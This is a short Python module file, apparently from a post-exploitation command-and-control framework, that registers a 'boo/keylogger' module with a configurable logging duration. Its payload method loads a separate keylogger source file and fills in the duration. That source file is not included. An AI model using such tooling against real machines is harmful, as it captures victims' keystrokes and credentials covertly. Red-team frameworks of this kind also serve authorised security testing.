from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/keylogger'
        self.language = 'boo'
        self.description = 'Grabs key strokes for x minutes'
        self.author = 'Devin Madewell'
        self.references = []
        self.options = {
            'Duration': {
                'Description'   :   'How long to log key strokes (in Minutes)',
                'Required'      :   False,
                'Value'         :   "2"
            }
        }

    def payload(self):
        with open('core/teamserver/modules/boo/src/keylogger.boo', 'r') as module_src:
            src = module_src.read()
            src = src.replace('MINUTES', self.options['Duration']['Value'])
            return src
